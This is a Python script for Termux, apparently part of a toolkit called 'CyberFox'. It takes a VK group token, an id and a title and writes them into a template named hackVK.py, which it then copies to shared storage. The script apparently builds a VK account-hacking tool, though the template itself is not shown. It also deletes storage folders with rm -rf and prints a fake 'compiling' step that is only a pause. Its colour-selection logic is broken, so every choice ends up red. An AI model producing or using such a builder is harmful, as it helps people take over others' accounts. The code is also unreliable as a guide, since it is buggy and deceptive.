from core.colors import *
import time
import os
import sys
try:
	os.system('termux-setup-storage')
except:
	pass
R = "\033[91m" 
P = "\033[95m" 
C = "\033[96m" 
DC = "\033[36m" 
B = "\033[94m" 
G = "\033[92m" 
Y = "\033[93m" 
W = "\033[0m"
os.system("rm -rf /sdcard/CyberFox1")
token=input(B+"token your group: "+W)
id=input(B+"your id P.s.(number id): "+W)
title=input(B+'title your script: '+W)
print(G+'''colors:
G - green
B - blue
W - white
P - pink
Y - yellow
R - red
'''+W)
color=input(B+'color title: '+W)
if color == "G" or "g":
	color="\033[92m"
if color == "B" or "b":
	color="\033[94m"
if color == "Y" or "y":
	color = "\033[93m" 
if color == "P" or "p":
	color="\033[95m"
if color == "W" or "w":
	color = "\033[0m"
if color == "R" or "r":
	color = "\033[91m" 

os.system("cp $HOME/CyberFox/core/hackVK.py $HOME/CyberFox")
f = open('/data/data/com.termux/files/home/CyberFox/hackVK.py','r+')
lines = f.readlines() 
f.seek(0) 
f.write("token="+"'"+token+"'" +"\n"+ "id="+"'"+id+"'"+"\n"+"title="+"'"+title+"'"+"\n"+"color="+"'"+color+"'")
for line in lines:
  f.write(line)
f.close()
os.system("mkdir /sdcard/CyberFox1 && cp $HOME/CyberFox/hackVK.py /sdcard/CyberFox1")
print(R+"compiling script..."+W)
time.sleep(7)
os.system("rm -rf $HOME/CyberFox/hackVK.py")
print(B+"complete, your script /sdcard/CyberFox1/hackVK.py"+W)
time.sleep(4)